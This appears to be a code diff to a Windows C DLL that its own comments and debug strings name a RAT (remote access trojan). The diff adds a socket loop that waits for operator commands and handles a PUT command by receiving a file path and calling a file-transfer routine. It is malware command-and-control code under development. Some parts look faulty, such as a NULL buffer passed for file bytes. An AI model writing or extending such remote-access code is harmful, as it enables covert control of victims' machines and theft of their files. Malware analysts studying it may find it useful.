@@ -91,14 +91,40 @@ INT startListen()
     closesocket(serverSock);
 
     // Receive from client until the peer shuts down the connection
+        // From here is where we are currently controling RAT functionality, i.e., we wait for commands and then call the appropiate handler and return to wait for more commands 
     do
     {
         printf("Waiting for more bytes... \n");
         status = recv(clientSock, recvBuf, recvBufLen, 0);
         if (status > 0)
         {
-            printf("Bytes received: %d \n", status);
+             printf("Bytes received: %d \n", status);
+             printf("bytes: %s\n", &recvBuf);
 
+             if (strcmp((const char*)&recvBuf, PUT) == 0)
+             {
+                 // Will have to receive again for the filepath OR put it in the same packet...
+                    // Prob safer to break up packets, could add delays etc
+                 status = recv(clientSock, recvBuf, recvBufLen, 0);
+                 if (status > 0)
+                 {
+                     char* fileBytes = NULL;
+                     status = performGetFile((const char*)&recvBuf, fileBytes);
+                     if (status != SUCCESS)
+                     {
+                         sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Failure recevied from performGetFile %d\n", status);
+                         OutputDebugStringA(msgBuf);
+                         goto cleanup;
+                     }
+                 }
+
+                 
+             }
+
+             // check for other functionality 
+
+             // dont need to worry about sending bytes back yet just read for our code and react as needed
+             /**
             sendStatus = send(clientSock, recvBuf, status, 0);
             if (sendStatus == SOCKET_ERROR)
             {
@@ -108,6 +134,7 @@ INT startListen()
                 return FALSE;
             }
             printf("Bytes sent: %d \n", sendStatus);
+            */
         }
         else if (status == 0)
         {
